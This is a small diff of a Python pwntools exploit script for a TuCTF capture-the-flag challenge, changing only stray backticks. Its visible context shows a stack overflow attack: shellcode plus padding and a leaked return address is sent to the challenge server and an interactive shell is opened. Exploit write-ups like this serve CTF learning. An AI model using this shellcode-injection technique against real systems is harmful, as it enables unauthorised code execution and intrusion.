@@ -1,4 +1,4 @@
-`#coding: utf-8
+#coding: utf-8
 from pwn import *
 
 IP = "chal.tuctf.com"
@@ -23,4 +23,4 @@ leak_ret = int(leak_ret, 16)
 payload = shellcode+"A"*(pad-len(shellcode))+p64(leak_ret)*2
 
 p.send(payload)
-p.interactive()`
+p.interactive()
